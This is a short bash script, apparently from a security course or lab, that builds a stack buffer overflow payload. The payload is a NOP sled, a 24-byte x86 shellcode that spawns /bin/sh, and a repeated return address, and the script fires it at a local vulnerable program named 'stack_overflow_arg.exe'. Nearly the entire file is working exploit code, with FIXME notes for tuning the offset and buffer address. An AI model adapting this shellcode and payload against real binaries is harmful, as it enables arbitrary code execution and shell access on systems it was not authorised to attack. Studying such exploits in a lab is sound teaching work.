#!/bin/bash
#
# local exploit code using bash script
#

# Generate payload in the format: | NOP sled | shellcode | repeated return address |
# write each line of shellcode generated by PEDA to a file

# write the user-level shellcode to a file
shellcode_file_name="shellcode.bin"
echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" > $shellcode_file_name
echo -ne "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" >> $shellcode_file_name

# vulnerable program to exploit
target_program="stack_overflow_arg.exe"
######FIXME
offset=144 # EIP+0+4 or look for [ESP] --> offset ... in PEDA pattern search
######
#python3 -c 'print("A"*144, end="")' | ./$target_program

######FIXME
# feed buffer variable's address in Little Endian; reverse of what you see on screen
# can add a few bytes so you can land away from the beginning address
#printf "buffer_address: %x\n" $((0xffffc2c0 + 20))
buffer_address="\xc0\xc2\xff\xff"
########

wc -c shellcode.bin
shellcode_size=24 # find and update the shellcode_size if necessary
repeat_return_address=5
return_address_size=$((4*$repeat_return_address)) # repeat return address 5 times
NOP_sled_size=$(($offset-$shellcode_size-$return_address_size))
printf "NOP Sled size: %d half-way: %d\n" $NOP_sled_size $((NOP_sled_size/2))
# now we've all the sizes we need for each section of the payload, write the complete payload to a file

# create an emptyfile, truncate if exists
payload_file_name="payload.bin"
echo -n > $payload_file_name

# write NOPs
for (( i=1; i <= $NOP_sled_size; i++ ))
do
    echo -ne "\x90" >> $payload_file_name
done

# write shellcode
cat $shellcode_file_name >> $payload_file_name

# write repeated return address
for (( i=1; i <= $repeat_return_address; i++ ))
do
    echo -ne $buffer_address >> $payload_file_name
done

echo "payload ready and has size of " $(wc -c $payload_file_name)
hexdump -C $payload_file_name
echo "sending the payload..."
./$target_program $(cat $payload_file_name)
